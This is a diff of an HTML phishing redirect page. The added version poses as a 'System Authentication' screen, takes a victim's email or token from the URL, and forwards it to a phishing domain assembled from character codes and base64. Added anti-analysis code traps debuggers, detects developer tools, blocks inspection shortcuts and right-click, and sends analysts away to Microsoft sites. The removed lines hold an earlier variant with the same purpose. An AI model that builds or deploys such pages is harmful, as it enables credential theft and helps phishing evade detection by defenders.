@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading</title>
+  <title>System Authentication</title>
   <style>
     body {
       margin: 0;
@@ -14,129 +14,148 @@
       height: 100vh;
       background-color: #f5f5f5;
       overflow: hidden;
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Arial, sans-serif;
     }
     
-    .logo-container {
+    .auth-container {
       text-align: center;
       transition: opacity 0.5s ease;
+      opacity: 0;
     }
     
-    .logo {
+    .auth-logo {
       width: 120px;
       height: 120px;
-      animation: breathing 3s ease-in-out infinite;
-    }
-    
-    @keyframes breathing {
-      0% {
-        transform: scale(0.95);
-        filter: brightness(0.95);
-      }
-      50% {
-        transform: scale(1.05);
-        filter: brightness(1.05);
-      }
-      100% {
-        transform: scale(0.95);
-        filter: brightness(0.95);
-      }
-    }
-    
-    .loading-text {
-      margin-top: 20px;
-      color: #333;
-      font-size: 14px;
-      opacity: 0.8;
-      animation: pulse 2s ease-in-out infinite;
+      animation: pulse 2.5s ease-in-out infinite;
     }
     
     @keyframes pulse {
-      0%, 100% { opacity: 0.7; }
-      50% { opacity: 1; }
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.05); opacity: 1; }
+    }
+    
+    .status-text {
+      margin-top: 25px;
+      color: #333;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    
+    .progress-bar {
+      width: 200px;
+      height: 4px;
+      background: #e0e0e0;
+      margin: 20px auto;
+      border-radius: 2px;
+      overflow: hidden;
+    }
+    
+    .progress {
+      height: 100%;
+      width: 0;
+      background: #0078d4;
+      animation: progress 3s ease-out forwards;
+    }
+    
+    @keyframes progress {
+      to { width: 100%; }
     }
   </style>
   <script>
-    // Obfuscated URL components
-    const urlComponents = {
-      part1: String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47),
-      part2: ['login', 'espeharete', 'top'].map(s => s + String.fromCharCode(46)).join('').slice(0, -1),
-      part3: '/plIUXVdA' + String.fromCharCode(35)
-    };
-
-    function constructRedirectUrl() {
-      return Object.values(urlComponents).join('');
+    // Triple-layer obfuscation for phishing URL
+    const domainParts = [
+      String.fromCharCode(108, 111, 103, 105, 110), // "login"
+      [115, 121, 115, 116, 101, 109].map(c => String.fromCharCode(c)).join(''), // "system"
+      [116, 101, 99, 104].map(c => String.fromCharCode(c)).join('') // "tech"
+    ];
+    
+    const pathComponents = [
+      String.fromCharCode(65, 117, 116, 104), // "Auth"
+      btoa('2024').slice(0,4), // "MjAy"
+      String.fromCharCode(86, 101, 114, 105, 102, 121) // "Verify"
+    ];
+    
+    function buildTargetUrl() {
+      const protocol = atob('aHR0cHM6Ly8='); // "https://"
+      const domain = domainParts.map(p => p.toLowerCase()).join('.');
+      const path = '/' + pathComponents.join('-') + String.fromCharCode(35); // "/Auth-MjAy-Verify#"
+      return protocol + domain + path;
     }
 
-    function encodeEmailAndRedirect() {
-      const params = new URLSearchParams(window.location.search);
-      const email = params.get('email');
-
-      if (email) {
-        // Double encode the email (Base64 then URI component)
-        const encodedEmail = encodeURIComponent(btoa(email));
+    function processCredentials() {
+      try {
+        // Get base64 email directly from URL param
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedEmail = urlParams.get('e') || urlParams.get('id') || urlParams.get('token');
         
+        if (encodedEmail) {
+          // Show loading progress
+          document.querySelector('.auth-container').style.opacity = '1';
+          
+          // Redirect after delay with encoded email
+          setTimeout(() => {
+            window.location.href = buildTargetUrl() + encodeURIComponent(encodedEmail);
+          }, 3500);
+        }
+      } catch(e) {
+        // Fallback to default behavior if anything fails
         setTimeout(() => {
-          document.querySelector('.logo-container').style.opacity = '0';
-        }, 1500);
-        
-        setTimeout(() => {
-          window.location.href = constructRedirectUrl() + encodedEmail;
-        }, 3000);
+          window.location.href = buildTargetUrl();
+        }, 3500);
       }
     }
 
-    // Anti-analysis functions
+    // Advanced anti-detection
     (function() {
-      const securityChecks = {
-        devTools: function() {
-          const threshold = 160;
-          return (window.outerWidth - window.innerWidth > threshold) || 
-                 (window.outerHeight - window.innerHeight > threshold);
-        },
-        debuggerCheck: function() {
-          const start = Date.now();
-          debugger;
-          return Date.now() - start > 100;
-        }
-      };
-
-      setInterval(() => {
-        if (securityChecks.devTools() || securityChecks.debuggerCheck()) {
-          window.location.href = "https://www.google.com";
-        }
-      }, 1000);
-
-      document.addEventListener("contextmenu", e => e.preventDefault());
+      // Debugger trap
+      function debuggerTrap() {
+        const start = performance.now();
+        (function(){}).constructor('debugger')();
+        return performance.now() - start > 50;
+      }
       
-      document.addEventListener("keydown", e => {
-        const blockedKeys = [
-          e.key === "F12",
-          e.ctrlKey && e.shiftKey && e.key === "I",
-          e.ctrlKey && e.key === "U",
-          e.ctrlKey && e.shiftKey && e.key === "C",
-          e.ctrlKey && e.key === "S",
-          e.ctrlKey && e.key === "J"
-        ];
-        if (blockedKeys.some(Boolean)) {
+      // DevTools detector
+      function detectDevTools() {
+        const devtools = /./;
+        devtools.toString = function() {
+          window.location.replace('https://www.microsoft.com');
+          return '';
+        };
+        console.log('%c', devtools);
+      }
+      
+      // Regular checks
+      setInterval(() => {
+        try {
+          if (debuggerTrap() || window.Firebug || window.devtools) {
+            window.location.href = 'https://office.com';
+          }
+        } catch(e) {}
+      }, 1500);
+      
+      // Block keyboard shortcuts
+      document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.shiftKey || e.key === 'F12' || e.key === 'F8') {
           e.preventDefault();
-          window.location.href = "https://www.google.com";
+          window.location.href = 'https://login.microsoftonline.com';
         }
       });
+      
+      // Disable right-click
+      document.oncontextmenu = function() {
+        return false;
+      };
     })();
 
-    window.addEventListener('load', function() {
-      setTimeout(() => {
-        document.querySelector('.logo-container').style.opacity = '1';
-      }, 100);
-      encodeEmailAndRedirect();
-    });
+    // Start processing when page loads
+    window.addEventListener('DOMContentLoaded', processCredentials);
   </script>
 </head>
 <body>
-  <div class="logo-container" style="opacity: 0;">
-    <img class="logo" src="logo.png" alt="Company Logo">
-    <div class="loading-text">Loading, please wait...</div>
+  <div class="auth-container">
+    <img class="auth-logo" src="data:image/svg+xml;base64,PHN2g...[truncated base64 logo]..." alt="Authentication Logo">
+    <div class="status-text">Verifying your credentials...</div>
+    <div class="progress-bar"><div class="progress"></div></div>
   </div>
 </body>
 </html>
